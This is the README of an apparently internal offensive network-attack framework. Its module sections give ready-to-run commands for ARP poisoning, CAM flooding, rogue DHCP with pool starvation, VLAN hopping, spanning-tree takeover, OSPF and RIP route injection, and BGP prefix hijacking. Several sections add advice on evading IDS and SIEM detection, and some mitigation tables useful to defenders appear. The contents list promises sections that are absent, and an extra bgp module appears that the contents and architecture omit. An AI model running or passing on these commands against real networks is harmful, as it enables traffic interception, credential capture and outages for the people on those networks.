# Bear Net RapidStrike — Layer 2 / Routing Assessment Framework

> **Authorized engagement use only.**
> Every run is recorded in an audit log tagged with the engagement ID, operator
> name, and client. Do not use against infrastructure you do not have written
> authorization to test.

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Requirements & Installation](#requirements--installation)
4. [Quick Start](#quick-start)
5. [Engagement Workflow](#engagement-workflow)
6. [Module Reference](#module-reference)
   - [preflight](#preflight--reconnaissance)
   - [arp](#arp--t1557002)
   - [cam](#cam--t1499)
   - [cdp](#cdp--t1557)
   - [dhcp](#dhcp--t1557003)
   - [dhcp-starve](#dhcp-starve--t1499)
   - [dvlan](#dvlan--t1599)
   - [impers](#impers--t1557)
   - [lldp](#lldp--t1557)
   - [mac](#mac--t1036005)
   - [mstp](#mstp--t1557)
   - [pvlan](#pvlan--t1599)
   - [stp](#stp--t1557)
   - [swspoof](#swspoof--t1557)
   - [vlan](#vlan--t1599)
   - [ospf](#ospf--t1557)
   - [rip](#rip--t1565002)
7. [Attack Chains](#attack-chains)
8. [Operational Security Notes](#operational-security-notes)
9. [Lab Setup (GNS3 / EVE-NG)](#lab-setup)
10. [Known Detection Signatures](#known-detection-signatures)

---

## Overview

Bear Net RapidStrike is an internal Layer 2 and routing-protocol assessment framework.
It consolidates 17 attack modules under a single authenticated CLI dispatcher
with mandatory engagement metadata and audit logging on every run.

**Scope:** Network infrastructure security assessments — switch misconfigurations,
L2 segmentation weaknesses, routing protocol injection, and MITM positioning.

**Not in scope:** Host exploitation, application-layer attacks.

---

## Architecture

```
rapidstrike.py          ← CLI dispatcher, engagement gate, audit logger
│
├── core/
│   ├── authz.py      ← Engagement metadata (ID, operator, client, scope note)
│   ├── logging_util.py← Structured audit logger (file + stdout)
│   ├── common.py     ← Shared helpers: require_root, resolve_mac, ip_forward
│   ├── rawsock.py    ← AF_PACKET raw socket injection (wire-speed, Linux only)
│   └── preflight.py  ← Pre-flight L2 mitigation reconnaissance
│
└── modules/
    ├── __init__.py   ← Module registry (MODULES list)
    ├── preflight     ← Reconnaissance: detect BPDU Guard, DAI, Port Security
    ├── arp           ← ARP cache poisoning MITM
    ├── cam           ← CAM table overflow (raw socket, ~300k fps)
    ├── cdp           ← CDP neighbor flooding
    ├── dhcp          ← Rogue DHCP server
    ├── dhcp-starve   ← DHCP pool exhaustion (parallel workers)
    ├── dvlan         ← Double 802.1Q tag VLAN hop
    ├── impers        ← L2 impersonation (CAM + ARP combined)
    ├── lldp          ← LLDP neighbor spoofing
    ├── mac           ← MAC address spoofing with vendor OUI
    ├── mstp          ← MSTP root bridge spoofing (IEEE 802.1s raw BPDU)
    ├── pvlan         ← Private VLAN bypass
    ├── stp           ← STP root bridge spoofing
    ├── swspoof       ← Switch spoofing via LLDP
    ├── vlan          ← VLAN scan via double-tag
    ├── ospf          ← OSPF disguised LSA injection
    └── rip           ← RIPv2 route injection with MD5 auth
```

---

## Requirements & Installation

### System requirements

| Item | Requirement |
|------|-------------|
| OS | Linux (Debian/Ubuntu/Kali recommended). Raw socket (CAM) requires Linux. |
| Python | 3.9+ |
| Privileges | Root / `CAP_NET_RAW` for all modules. |
| Interface | Must be connected to the target L2 segment. Promiscuous mode recommended. |

### Install

```bash
git clone <internal-repo>/RapidStrike.git
cd RapidStrike
pip install -r requirements.txt --break-system-packages

# Verify
sudo python3 rapidstrike.py list
```

`requirements.txt` contains only `scapy>=2.5.0`.
All other dependencies are Python standard library.

### Enable promiscuous mode (recommended)

```bash
ip link set eth0 promisc on
```

---

## Quick Start

```bash
# List all modules with ATT&CK IDs
sudo python3 rapidstrike.py list

# Help for any module
sudo python3 rapidstrike.py arp --help

# Minimal run (engagement fields default to UNSPECIFIED — not recommended)
sudo python3 rapidstrike.py cam -i eth0 --count 100000

# Proper engagement run
sudo python3 rapidstrike.py arp \
    -i eth0 -t 192.168.1.100 -g 192.168.1.1 \
    --engagement-id RoE-2024-001 \
    --operator johto \
    --client "ACME Corp" \
    --scope-note "Lab segment 192.168.1.0/24 — authorized per signed RoE"
```

---

## Engagement Workflow

**Recommended sequence for every engagement:**

```
1. Verify written authorization (RoE / SoW) covers the target segment.

2. Run preflight to detect active mitigations:
   sudo python3 rapidstrike.py preflight -i eth0 --gateway 192.168.1.1

3. Select modules that are viable given preflight output.

4. Run with full engagement metadata (--engagement-id, --operator, --client).

5. Collect audit log (rapidstrike_audit.log) as evidence artifact.

6. Restore all tables / state before leaving the segment.
   (ARP module auto-restores; STP topology recovers within ~30s after stop.)
```

All engagement flags are appended to **every** log line:

```
2024-11-15 14:32:01 | [eng=RoE-2024-001 op=johto client=ACME Corp] INFO | START | technique=T1557.002 ...
```

---

## Module Reference

---

### `preflight` — Reconnaissance

**What it does**

Passive (and one semi-passive) L2 environment scan to detect active switch
security controls before running any attack module. Takes about 30 seconds total.

| Check | Method | Detects |
|-------|--------|---------|
| STP/BPDU | Passive listen | BPDU Guard risk, STP topology, root bridge |
| DAI | 1 spoofed ARP (semi-active) | Dynamic ARP Inspection |
| MAC diversity | Passive observe | Port Security enforcement level |
| DHCP traffic | Passive listen | DHCP Snooping trust configuration |

**Syntax**

```
sudo python3 rapidstrike.py preflight -i IFACE [--gateway GW_IP]
```

**Examples**

```bash
# Passive only (no gateway probe)
sudo python3 rapidstrike.py preflight -i eth0

# Full scan including DAI probe
sudo python3 rapidstrike.py preflight -i eth0 --gateway 192.168.1.1

# Custom timeouts
sudo python3 rapidstrike.py preflight -i eth0 -g 192.168.1.1 \
    --bpdu-timeout 16 --mac-timeout 20
```

**Output interpretation**

```
[Preflight] STP active | root_priority=4096 root_mac=00:11:22:33:44:55 hello≈2.0s
[Preflight] WARNING: BPDU Guard may be active. STP attack will cause err-disabled.
[Preflight] DAI LIKELY ACTIVE — spoofed ARP was not echoed.
[Preflight] Only 2 unique MACs seen — Port Security may be enforced.

PREFLIGHT SUMMARY
[!] STP active → BPDU Guard risk (stp/mstp/swspoof may err-disable port)
[!] DAI LIKELY ACTIVE → arp/impers will be blocked at switch hardware
[!] Port Security likely → cam/mac will trigger err-disabled immediately
```

---

### `arp` — T1557.002

**What it does**

Bidirectional ARP cache poisoning between victim and gateway.
Sends gratuitous ARP replies claiming to be both the gateway (to victim)
and the victim (to gateway). With IP forwarding enabled, attacker sits
transparently inline — full MITM for all L3 traffic.

ARP tables are restored to correct values on exit (SIGINT or timeout).

**Prerequisites**

- Attacker on the same L2 segment as victim and gateway.
- DAI **not** active (detect with preflight).
- `--one-way` is useful when only victim traffic needs interception
  (e.g., capture credentials without affecting gateway routing table).

**Syntax**

```
sudo python3 rapidstrike.py arp -i IFACE -t VICTIM_IP -g GATEWAY_IP [options]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-i / --iface` | required | Interface |
| `-t / --target` | required | Victim IP |
| `-g / --gateway` | required | Gateway IP |
| `--interval` | 2.0s | Re-poison interval |
| `--jitter` | 0.0s | Random jitter on interval (breaks IDS periodic detection) |
| `--one-way` | off | Poison only the victim, not the gateway |

**Examples**

```bash
# Standard bidirectional MITM
sudo python3 rapidstrike.py arp -i eth0 -t 192.168.1.100 -g 192.168.1.1

# Stealthy: slower interval + jitter to avoid periodic-ARP IDS signature
sudo python3 rapidstrike.py arp -i eth0 -t 192.168.1.100 -g 192.168.1.1 \
    --interval 5 --jitter 3

# One-way: only intercept victim's outbound traffic
sudo python3 rapidstrike.py arp -i eth0 -t 192.168.1.100 -g 192.168.1.1 \
    --one-way
```

**Effectiveness vs hardened targets**

| Defense | Effect |
|---------|--------|
| DAI (Dynamic ARP Inspection) | **Blocks completely.** Switch hardware drops forged ARPs from untrusted ports. |
| Static ARP entries | **Blocks.** Static entries are not overwritten by dynamic ARP. |
| DHCP Snooping (without DAI) | No effect — ARP is separate. |
| ARPALERT / XarpWatch | Generates alert but does not block. |

**Evasion**

- Use `--jitter` to break fixed-interval IDS signatures.
- Reduce `--interval` to 1s to minimize window where victim's real ARP
  reply can overwrite your poison before next re-poison cycle.

---

### `cam` — T1499

**What it does**

Floods the switch CAM (Content Addressable Memory) table with frames bearing
random source MACs. Once the table is full, the switch falls back to flooding
all frames out every port in the source VLAN — effectively converting the switch
into a hub. This enables passive traffic capture from any port on the segment.

Uses **AF_PACKET raw sockets** (Linux) for wire-speed injection:
~300,000 frames/sec with 4 threads vs ~5,000 with Scapy.

**Prerequisites**

- Port Security **not** active (detect with preflight — if fewer than 4–5 MACs
  are visible, assume Port Security is enforced).
- Target switch must fail-open (most Cisco Catalyst fail-open when CAM full;
  some enterprise switches drop excess frames instead of flooding).

**Syntax**

```
sudo python3 rapidstrike.py cam -i IFACE [options]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-i / --iface` | required | Interface |
| `-c / --count` | 50,000 | Total frames to send |
| `--threads` | 4 | Parallel sender threads (Linux only) |
| `--rate` | 0 (unlimited) | Rate limit in frames/sec. Use ~10,000 to avoid triggering rate-based IDS |

**Examples**

```bash
# Wire-speed flood (unmanaged / SOHO switch)
sudo python3 rapidstrike.py cam -i eth0 --count 100000

# Throttled to stay under rate-limit threshold
sudo python3 rapidstrike.py cam -i eth0 --count 200000 --rate 8000

# Max parallelism for large CAM tables (48k+ entries)
sudo python3 rapidstrike.py cam -i eth0 --count 500000 --threads 8
```

**Effectiveness vs hardened targets**

| Defense | Effect |
|---------|--------|
| Port Security (maximum N) | **Blocks immediately.** First non-whitelisted MAC triggers err-disabled. |
| CAM table protected by hardware rate limiter | Reduces impact; switch may still flood but recovers faster. |
| 802.1X port authentication | Does not block CAM flood (L2 is already connected at physical layer). |

**Evasion**

- No practical evasion against Port Security — it triggers on the first fake frame.
- Use `--rate` to reduce the per-second injection rate, staying under
  threshold-based monitoring alerts on SIEM.
- Follow up with passive sniffing (Wireshark / tcpdump in promiscuous mode)
  immediately after flood — the hub-mode window is often brief (switch recovers
  as soon as legitimate frames repopulate the CAM).

---

### `cdp` — T1557

**What it does**

Floods the switch with fake Cisco Discovery Protocol (CDP) neighbor entries,
each claiming to be a different Cisco device. Targets the CDP neighbor table
(stored in NVRAM-backed memory on most IOS devices). Overflow may cause:
- CDP process crash (IOS 12.x / older)
- Memory exhaustion on embedded switches
- Topology poisoning in NMS systems that consume CDP data

**Prerequisites**

- CDP must be enabled on the target port (`cdp enable` — default on Cisco access ports).
- Unpatched IOS / IOS-XE (CDPwn vulnerabilities patched in 2020+).
- Access to the same L2 segment.

**Syntax**

```
sudo python3 rapidstrike.py cdp -i IFACE [options]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-i / --iface` | required | Interface |
| `-c / --count` | 1,000 | Number of fake CDP frames |
| `--interval` | 0.1s | Interval between frames |

**Examples**

```bash
# Standard CDP flood
sudo python3 rapidstrike.py cdp -i eth0 --count 2000

# Slow drip for topology poisoning in NMS (avoid triggering flood detection)
sudo python3 rapidstrike.py cdp -i eth0 --count 500 --interval 1.0
```

---

### `dhcp` — T1557.003

**What it does**

Runs a rogue DHCP server that responds to client DISCOVER/REQUEST messages,
handing out a fake gateway and DNS server. Clients that accept the rogue
OFFER will route all traffic through the attacker.

**Important:** DHCP is a race — clients accept the first OFFER received.
Pair with `dhcp-starve` to exhaust the legitimate server's pool first,
or run during a maintenance window when the real server is offline.

**Prerequisites**

- DHCP Snooping **not** active on the port (or attacker on a trusted port).
- Target clients on the same L2 segment.
- Attacker has a routable IP and has IP forwarding enabled for MITM.

**Syntax**

```
sudo python3 rapidstrike.py dhcp -i IFACE --pool START-END --gateway GW --dns DNS --server-ip SRV_IP
```

| Flag | Required | Description |
|------|----------|-------------|
| `--pool` | yes | IP range, e.g. `10.0.0.100-10.0.0.200` |
| `--gateway` | yes | Gateway IP to hand out (attacker's IP for MITM) |
| `--dns` | yes | DNS server to hand out (attacker's IP for DNS hijack) |
| `--server-ip` | yes | IP this server claims to have |
| `--netmask` | 255.255.255.0 | Subnet mask |
| `--lease` | 120s | Lease time (short = clients re-request quickly) |

**Examples**

```bash
# Rogue DHCP with attacker as gateway + DNS (full MITM)
sudo python3 rapidstrike.py dhcp \
    -i eth0 \
    --pool 192.168.1.150-192.168.1.200 \
    --gateway 192.168.1.50 \
    --dns 192.168.1.50 \
    --server-ip 192.168.1.50

# Short lease to force frequent renewals (clients re-request every 60s)
sudo python3 rapidstrike.py dhcp \
    -i eth0 \
    --pool 10.0.0.50-10.0.0.100 \
    --gateway 10.0.0.1 \
    --dns 8.8.8.8 \
    --server-ip 10.0.0.50 \
    --lease 60
```

**Chain with dhcp-starve:**

```bash
# Step 1: exhaust the legitimate server's pool
sudo python3 rapidstrike.py dhcp-starve -i eth0 --workers 16 &

# Step 2: once pool is exhausted, start rogue server
# (clients that couldn't get an IP will re-broadcast DISCOVER)
sudo python3 rapidstrike.py dhcp -i eth0 --pool 192.168.1.150-192.168.1.200 \
    --gateway 192.168.1.50 --dns 192.168.1.50 --server-ip 192.168.1.50
```

---

### `dhcp-starve` — T1499

**What it does**

Exhausts the DHCP server's IP pool by sending parallel DISCOVER/REQUEST cycles
with fresh random source MACs. Once the pool is empty, new clients receive no
OFFER and cannot obtain network connectivity.

Uses **8 parallel worker threads** (default) for rapid pool exhaustion.
A /24 pool (254 IPs) is typically exhausted in 30–90 seconds depending
on the server's response time.

**Syntax**

```
sudo python3 rapidstrike.py dhcp-starve -i IFACE [options]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--workers` | 8 | Parallel discover+request threads |
| `--timeout` | 2.0s | OFFER wait timeout per discover |
| `--discover-only` | off | Skip REQUEST phase (faster; server may GC unconfirmed offers) |
| `--target-server` | any | Accept offers only from specific server IP |

**Examples**

```bash
# Default (8 workers, full D/R cycle)
sudo python3 rapidstrike.py dhcp-starve -i eth0

# Aggressive mode against a slow server
sudo python3 rapidstrike.py dhcp-starve -i eth0 --workers 16 --timeout 1.0

# Blind flood: discover-only (use when server rate-limits REQUEST)
sudo python3 rapidstrike.py dhcp-starve -i eth0 --discover-only --workers 32

# Target only a specific server (ignore secondary DHCP)
sudo python3 rapidstrike.py dhcp-starve -i eth0 --target-server 192.168.1.1
```

---

### `dvlan` — T1599

**What it does**

Injects Ethernet frames with two 802.1Q VLAN tags. The switch strips the outer
tag (which matches the native/access VLAN of the attacker's port) and forwards
the frame into the inner VLAN — bypassing VLAN segmentation without requiring
a trunk port.

**Precondition:** Attacker must be on the **native VLAN** of a trunk port, or
on an access port whose VLAN matches a trunk port's native VLAN. DTP must be
enabled or the port must be explicitly configured as trunk.

**Syntax**

```
sudo python3 rapidstrike.py dvlan -i IFACE --outer-vlan N --inner-vlan N --target-ip IP
```

| Flag | Description |
|------|-------------|
| `--outer-vlan` | Native VLAN of the attacker's port (stripped by first switch) |
| `--inner-vlan` | Target VLAN to hop into |
| `--target-ip` | Destination IP in the target VLAN |
| `-c / --count` | Packets to send (default 100) |

**Examples**

```bash
# Hop from native VLAN 1 into management VLAN 99
sudo python3 rapidstrike.py dvlan -i eth0 --outer-vlan 1 --inner-vlan 99 \
    --target-ip 10.99.0.1 --count 500

# Probe multiple target VLANs (use vlan module for automated scan)
for VLAN in 10 20 30 50 99 100; do
    sudo python3 rapidstrike.py dvlan -i eth0 --outer-vlan 1 --inner-vlan $VLAN \
        --target-ip 192.168.${VLAN}.1 --count 10
done
```

---

### `impers` — T1557

**What it does**

Combined L2 impersonation attack: simultaneously poisons the switch CAM table
(to redirect traffic destined for the target) and the gateway ARP table (to
maintain the deception). Two modes:

- `black_hole`: All traffic to the target is dropped (DoS from switch/gateway perspective).
- `white_hole`: ICMP ping requests are answered with fake ICMP replies (intercept mode).

**Syntax**

```
sudo python3 rapidstrike.py impers -i IFACE -t TARGET_IP [options]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | black_hole | `black_hole` or `white_hole` |
| `--duration` | 300s | Run time in seconds |
| `--pcap` | off | Capture intercepted traffic to PCAP |

**Examples**

```bash
# Black-hole a host (cuts it off from the network)
sudo python3 rapidstrike.py impers -i eth0 --target-ip 192.168.1.100 --mode black_hole

# Intercept mode with PCAP capture
sudo python3 rapidstrike.py impers -i eth0 --target-ip 192.168.1.100 \
    --mode white_hole --pcap /tmp/intercept.pcap --duration 600
```

---

### `lldp` — T1557

**What it does**

Injects LLDP (Link Layer Discovery Protocol) frames with spoofed neighbor
identities. Targets the LLDP neighbor table on IEEE 802.1AB-compliant switches.
Can be used to:

- Poison network management systems (NMS) consuming LLDP topology data.
- Test whether LLDP is disabled on access ports (CIS Benchmark recommendation).

**Syntax**

```
sudo python3 rapidstrike.py lldp -i IFACE [--chassis-id ID] [--port-id ID] [-c COUNT]
```

**Examples**

```bash
sudo python3 rapidstrike.py lldp -i eth0 --count 100

sudo python3 rapidstrike.py lldp -i eth0 \
    --chassis-id "Cisco-Catalyst-9300-01" \
    --port-id "GigabitEthernet0/0/1" \
    --count 200
```

---

### `mac` — T1036.005

**What it does**

Sends packets with a spoofed source MAC address, optionally using a specific
vendor OUI. Use cases:

- Bypass MAC-based access control lists.
- Identity spoofing in pre-802.1X environments.
- Test MAC filtering effectiveness.
- Confuse SIEM log correlation by injecting false MAC-to-IP mappings.

**Syntax**

```
sudo python3 rapidstrike.py mac -i IFACE [--spoofed-mac MAC] [--vendor VENDOR] [options]
```

| Flag | Description |
|------|-------------|
| `--spoofed-mac` | Specific MAC to spoof (e.g. `00:11:22:33:44:55`) |
| `--vendor` | Vendor OUI: `cisco`, `hp`, `dell`, `apple`, `microsoft`, `google`, `random` |
| `--target-ip` | Destination IP (default 192.168.1.1) |
| `-c / --count` | Packets to send (default 100) |
| `--pcap` | Capture to PCAP |

**Examples**

```bash
# Spoof as a Cisco device
sudo python3 rapidstrike.py mac -i eth0 --vendor cisco --target-ip 192.168.1.1

# Spoof a specific known MAC (e.g. clone a whitelisted device)
sudo python3 rapidstrike.py mac -i eth0 --spoofed-mac 00:11:22:33:44:55 \
    --target-ip 192.168.1.1 --count 50
```

---

### `mstp` — T1557

**What it does**

Injects MST BPDUs (IEEE 802.1s) crafted as raw bytes — not relying on scapy's
STP layer which does not support MSTP fields. Claims bridge priority = 0 to
become the CIST/MSTI root, forcing topology reconvergence.

**Warning:** MSTP reconvergence causes a brief (<1s RSTP, up to 30s legacy STP)
network outage during topology recalculation. Only use in scoped lab segments.

**Syntax**

```
sudo python3 rapidstrike.py mstp -i IFACE [--bridge-priority N] [--instance-id N] [-c COUNT]
```

**Examples**

```bash
# Attack CIST (instance 0, all VLANs)
sudo python3 rapidstrike.py mstp -i eth0 --bridge-priority 0 --instance-id 0 --count 30

# Attack a specific MSTI
sudo python3 rapidstrike.py mstp -i eth0 --bridge-priority 0 --instance-id 10 --count 20
```

---

### `pvlan` — T1599

**What it does**

Attempts to bypass Private VLAN (PVLAN) isolation using three techniques:

| Mode | Mechanism |
|------|-----------|
| `isolated` | Send from isolated port using TTL=1 to force proxy-ARP routing through uplink |
| `community` | Communicate within a community VLAN to reach other community members |
| `promiscuous` | Spoof as promiscuous port to reach isolated hosts |

**Syntax**

```
sudo python3 rapidstrike.py pvlan -i IFACE --target-ip IP [--mode MODE] [-c COUNT]
```

**Examples**

```bash
sudo python3 rapidstrike.py pvlan -i eth0 --target-ip 10.0.0.100 --mode isolated
sudo python3 rapidstrike.py pvlan -i eth0 --target-ip 10.0.0.100 --mode promiscuous
```

---

### `stp` — T1557

**What it does**

Sends STP Configuration BPDUs with bridge priority = 0, attempting to win
root bridge election on the spanning tree. If successful, the switch recalculates
topology and routes all traffic through the attacker's port — enabling passive
traffic interception on the entire VLAN.

**Prerequisites**

- STP is running on the segment (verify with preflight).
- BPDU Guard **not** active on the target port (preflight detects this).
- Root Guard **not** configured on upstream port.

**Syntax**

```
sudo python3 rapidstrike.py stp -i IFACE [--bridge-priority N] [-c COUNT] [--interval S]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--bridge-priority` | 0 | Lower = higher priority. Must be lower than current root. |
| `-c / --count` | 10 | BPDUs to send (10 is enough to win election) |
| `--interval` | 1.0s | Interval (match or slightly faster than current hello time) |

**Examples**

```bash
# Standard root bridge takeover
sudo python3 rapidstrike.py stp -i eth0 --bridge-priority 0 --count 15

# Verify takeover with Wireshark: capture STP on any other port in same VLAN
# You should see "Topology Change" flag in BPDUs after a few seconds.

# Combined with IP forwarding for transparent MITM
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo python3 rapidstrike.py stp -i eth0 --bridge-priority 0
```

---

### `swspoof` — T1557

**What it does**

Continuously broadcasts LLDP frames with a Cisco OUI MAC address claiming to
be a Cisco switch. On older or misconfigured switches, this may trigger DTP
(Dynamic Trunking Protocol) negotiation, causing the port to become a trunk —
giving the attacker access to all VLANs.

**Syntax**

```
sudo python3 rapidstrike.py swspoof -i IFACE [--chassis-id ID] [--interval S] [--duration S]
```

**Examples**

```bash
# Continuous spoofing for 5 minutes
sudo python3 rapidstrike.py swspoof -i eth0 --duration 300

# Custom switch identity
sudo python3 rapidstrike.py swspoof -i eth0 \
    --chassis-id "Cisco-Catalyst-3850-01" \
    --port-id "GigabitEthernet1/0/24" \
    --interval 3 --duration 120
```

---

### `vlan` — T1599

**What it does**

Automated VLAN scan via double-tagging: iterates over a specified VLAN range,
sending double-tagged frames into each VLAN to identify which VLANs are
reachable from the native VLAN. Useful for mapping blind topology.

**Syntax**

```
sudo python3 rapidstrike.py vlan -i IFACE [--vlans SPEC] [--native-vlan N] [--target-ip IP]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--vlans` | `1-100,200,300,400,500,1000,2000` | Comma-separated IDs or ranges |
| `--native-vlan` | 1 | Native VLAN of attacker's port (outer tag) |
| `--count` | 1 | Packets per VLAN (1 is enough for reachability scan) |

**Examples**

```bash
# Scan default VLAN range
sudo python3 rapidstrike.py vlan -i eth0

# Target specific VLANs with 5 packets each
sudo python3 rapidstrike.py vlan -i eth0 --vlans "10,20,30,99,100,200" --count 5

# Full scan 1-4094 (slow, use for comprehensive assessment)
sudo python3 rapidstrike.py vlan -i eth0 --vlans "1-4094" --count 1
```

---

### `ospf` — T1557

**What it does**

Injects a disguised Router-LSA into an OSPF area, exploiting the Nakibly et al.
"disguised LSA" technique to bypass OSPF's fightback mechanism.

**Attack sequence:**

1. Sniff Hello packets to learn router IDs and authentication config.
2. Sniff the victim router's next LSUpdate to capture the current LSA.
3. Craft a **trigger LSA** (seq+1) to force the victim to flood its own copy.
4. Craft a **disguised LSA** (seq+2) with a checksum collision against the victim's
   expected fightback — the neighbor accepts it as a duplicate and discards the
   victim's legitimate fightback.
5. Send both in rapid succession within the MinLSInterval window (4500–5000ms).

**Lab validation required.** Timing is sensitive to network jitter.
Test in GNS3/EVE-NG against the exact target IOS version before field use.

**Syntax**

```
sudo python3 rapidstrike.py ospf -v VICTIM_IP -n NEIGHBOR_IP -i IFACE [-k MD5_KEY]
```

| Flag | Description |
|------|-------------|
| `-v / --victim-ip` | Interface IP of the victim router |
| `-n / --neighbor-ip` | IP of the neighbor that receives our disguised LSA |
| `-i / --iface` | Interface for sniffing and sending |
| `-k / --md5-key` | MD5 auth key (required if area uses MD5 authentication) |

**Examples**

```bash
# Unauthenticated OSPF network
sudo python3 rapidstrike.py ospf \
    -v 10.0.0.1 -n 10.0.0.2 -i eth0

# MD5-authenticated area (key must be known)
sudo python3 rapidstrike.py ospf \
    -v 10.0.0.1 -n 10.0.0.2 -i eth0 -k "ospf_secret_key"
```

**Mitigations:** OSPF cryptographic authentication with strong rotating keys;
passive interfaces on access segments; LSDB integrity monitoring.

---

### `rip` — T1565.002

**What it does**

Advertises a forged RIPv2 route with a metric lower than the current best path,
pulling traffic for a target prefix through the attacker. Supports:

- Plaintext and keyed-MD5 authentication (RFC 2082).
- `--probe` mode: sniffs real RIP traffic to learn the current metric
  for a prefix, then automatically injects at metric-1.
- `--dry-run`: build and display the packet without sending (lab validation).
- Continuous re-advertisement (`--count 0`) to maintain the injected route.

**Syntax**

```
sudo python3 rapidstrike.py rip -n NETWORK -s SPOOF_SRC -i IFACE [options]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-n / --network` | required | Network prefix to announce |
| `-s / --spoof-ip` | required | Source IP (injected next-hop) |
| `-m / --metric` | — | Metric (1–16). Omit when using `--probe`. |
| `--mask` | 255.255.255.0 | Netmask (dotted or CIDR) |
| `--auth-type` | none | `none`, `plain`, or `md5` |
| `--auth-key` | — | Authentication key |
| `--probe` | off | Sniff first to learn current metric, inject metric-1 |
| `--interval` | 30s | Re-advertisement interval (match RIP timer) |
| `--count` | 0 (infinite) | Number of advertisements |
| `--dry-run` | off | Print packet, do not send |

**Examples**

```bash
# Dry-run: inspect packet before sending
sudo python3 rapidstrike.py rip \
    -n 10.0.0.0 --mask 255.0.0.0 -m 1 -s 192.168.1.50 -i eth0 \
    --dry-run

# Auto-probe metric and inject at metric-1
sudo python3 rapidstrike.py rip \
    -n 10.0.0.0 -s 192.168.1.50 -i eth0 \
    --probe --probe-timeout 40

# Plaintext-authenticated RIP
sudo python3 rapidstrike.py rip \
    -n 10.0.0.0 -m 1 -s 192.168.1.50 -i eth0 \
    --auth-type plain --auth-key "rip_password"

# MD5-authenticated RIP (validate layout with Wireshark first)
sudo python3 rapidstrike.py rip \
    -n 10.0.0.0 -m 1 -s 192.168.1.50 -i eth0 \
    --auth-type md5 --auth-key "rip_md5_key" --auth-keyid 1

# Continuous injection (maintain route indefinitely)
sudo python3 rapidstrike.py rip \
    -n 172.16.0.0 --mask 255.255.0.0 -m 1 -s 10.0.0.50 -i eth0 \
    --count 0 --interval 30
```

**Mitigations:** RIPv2 with strong MD5 keys; passive interfaces on access segments;
prefix-list / distribute-list filtering; prefer OSPF/EIGRP with proper authentication.


---

### `bgp` — T1557

**What it does**

Establishes a real BGP TCP session (port 179) with a target router and injects
malicious UPDATE messages to redirect traffic for a chosen IP prefix.

The module implements a full BGP-4 state machine (RFC 4271):
`OPEN → KEEPALIVE exchange → UPDATE injection → periodic KEEPALIVE maintenance`.
Routes are cleanly withdrawn on exit (SIGINT or `--duration` expiry).

**Two hijack modes**

| Mode | Mechanism | Reliability |
|------|-----------|-------------|
| `subprefix` | Announce a `/n+1` (more specific than target `/n`). Wins by longest-prefix-match — no AS manipulation needed. | High — works as long as peer propagates more-specifics |
| `origin` | Announce the exact same prefix from attacker AS. Wins only if AS-path is shorter or MED is lower. | Lower — many routers have local-pref / route-policy that overrides |

**Prerequisites**

- TCP port 179 reachable to target BGP router.
- Target configured to accept session from attacker IP/AS — common in:
  misconfigured iBGP route reflectors, unauthenticated eBGP peers,
  MPLS PE-CE sessions without MD5, SD-WAN fabric BGP overlays.
- MD5-authenticated sessions (`--md5-key`): requires Linux kernel + root
  to set `IP_TCP_MD5SIG` socket option. Confirm key before running.

**Syntax**

```
sudo python3 rapidstrike.py bgp \
    --peer-ip PEER_IP --peer-as PEER_AS \
    --local-as LOCAL_AS --router-id LOCAL_RID \
    --prefix TARGET_PREFIX --next-hop NEXT_HOP \
    [--mode subprefix|origin] [options]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--peer-ip / -P` | required | Target BGP router IP |
| `--peer-as` | required | Target router's AS number |
| `--local-as` | required | Attacker AS to present in OPEN |
| `--router-id` | required | Attacker router-ID (dotted-decimal) |
| `--prefix / -n` | required | Prefix to hijack (e.g. `10.0.0.0/24`) |
| `--next-hop` | required | NEXT_HOP IP in UPDATE (usually attacker's IP) |
| `--mode` | subprefix | `subprefix` or `origin` |
| `--med` | 0 | MED attribute (lower = preferred) |
| `--local-pref` | 200 | LOCAL_PREF for iBGP (higher = preferred) |
| `--as-path` | — | Extra ASNs to prepend (e.g. `65001,65002`) |
| `--hold-time` | 90s | BGP hold time |
| `--duration` | 300s | Session duration before clean withdrawal |
| `--md5-key` | — | TCP MD5 key (Linux only) |
| `--dry-run` | off | Print UPDATE hex dump without connecting |

**Examples**

```bash
# Dry-run: inspect UPDATE packet before connecting
sudo python3 rapidstrike.py bgp \
    --peer-ip 10.0.0.1 --peer-as 65001 \
    --local-as 65099 --router-id 10.0.0.99 \
    --prefix 192.168.10.0/24 --next-hop 10.0.0.99 \
    --mode subprefix --dry-run

# Subprefix hijack: redirect 192.168.10.0/25 via attacker
sudo python3 rapidstrike.py bgp \
    --peer-ip 10.0.0.1 --peer-as 65001 \
    --local-as 65099 --router-id 10.0.0.99 \
    --prefix 192.168.10.0/24 --next-hop 10.0.0.99 \
    --mode subprefix --duration 600 \
    --engagement-id RoE-001 --operator johto --client TARGET

# Origin hijack with AS-path prepending (make our path look shorter)
sudo python3 rapidstrike.py bgp \
    --peer-ip 10.0.0.1 --peer-as 65001 \
    --local-as 65099 --router-id 10.0.0.99 \
    --prefix 10.0.0.0/24 --next-hop 10.0.0.99 \
    --mode origin --local-pref 300 --med 0

# iBGP session (same AS, unauthenticated route reflector misconfiguration)
sudo python3 rapidstrike.py bgp \
    --peer-ip 10.10.0.1 --peer-as 65000 \
    --local-as 65000 --router-id 10.10.0.99 \
    --prefix 172.16.0.0/16 --next-hop 10.10.0.99 \
    --mode subprefix --local-pref 300

# MD5-authenticated eBGP session
sudo python3 rapidstrike.py bgp \
    --peer-ip 10.0.0.1 --peer-as 65001 \
    --local-as 65099 --router-id 10.0.0.99 \
    --prefix 10.0.0.0/24 --next-hop 10.0.0.99 \
    --md5-key "bgp_secret_key"
```

**Effectiveness vs hardened targets**

| Defense | Effect |
|---------|--------|
| BGP TCP MD5 authentication (RFC 2385) | Blocks without the correct key. Many enterprise routers still have peers without MD5. |
| RPKI / ROA validation (origin mode) | **Blocks origin hijack** if ROA exists for the prefix. Subprefix is not covered by existing ROA for the parent prefix. |
| prefix-list / maximum-prefix | Drops our announcement if the prefix is filtered or exceeds max-prefix limit. |
| MANRS-compliant upstream | Routes not propagated externally — internal hijack still works. |

